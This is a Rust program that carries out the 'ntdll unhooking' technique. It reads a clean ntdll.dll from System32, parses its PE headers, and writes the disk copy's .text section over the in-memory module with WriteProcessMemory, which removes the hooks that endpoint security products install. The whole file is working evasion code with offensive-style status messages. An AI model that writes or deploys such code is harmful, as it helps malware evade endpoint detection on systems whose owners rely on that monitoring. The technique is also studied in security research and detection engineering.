use std::{ffi::CStr, fs::File, io::Read, net::ToSocketAddrs, str::from_utf8};

use windows_sys::Win32::System::{
    Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, WriteProcessMemory},
    LibraryLoader::GetModuleHandleA,
    SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
    Threading::GetCurrentProcess,
};

fn main() {
    unsafe {
        let mut fd = match File::open(r"C:\Windows\System32\ntdll.dll") {
            Ok(file) => file,
            Err(e) => {
                eprintln!("Failed to open file: {}", e);
                return;
            }
        };

        let mut buffer: Vec<u8> = Vec::new();

        fd.read_to_end(&mut buffer).unwrap();

        println!("[+] File size: {} bytes", buffer.len());

        let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);

        if ntdll.is_null() {
            println!("[-] Failed to get NTDLL handle");
            return;
        }

        println!("[+] NTDLL loaded at: 0x{:X}", ntdll as usize);

        let dos_header = buffer.as_ptr() as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS signature");
            return;
        }

        let nt_headers = (buffer.as_ptr() as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT signature");
            return;
        }

        let first_section: *const IMAGE_SECTION_HEADER = (nt_headers as *const u8)
            .add(size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;

        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
            let section = first_section.add(i as usize);

            let name = from_utf8(&(*section).Name)
                .unwrap()
                .trim_end_matches(char::from(0));
            if name.eq_ignore_ascii_case(".text") {
                println!(
                    "[+] Found: {} section at 0x{:X}",
                    name,
                    (*section).VirtualAddress
                );

                let text_sec_addr =
                    (buffer.as_ptr() as *const u8).add((*section).PointerToRawData as usize);
                let text_size = (*section).SizeOfRawData as usize;

                let ntdll_virtual_addr =
                    (ntdll as *const u8).add((*section).VirtualAddress as usize);

                let mut bytes_written: usize = 0;
                if WriteProcessMemory(
                    GetCurrentProcess(),
                    ntdll_virtual_addr as _,
                    text_sec_addr as _,
                    text_size,
                    &mut bytes_written,
                ) == 0
                {
                    println!("[-] Failed to replace the .text section");
                }

                break;
            }
        }

        println!("[+] Unhooked ntdll.dll");
    }
}
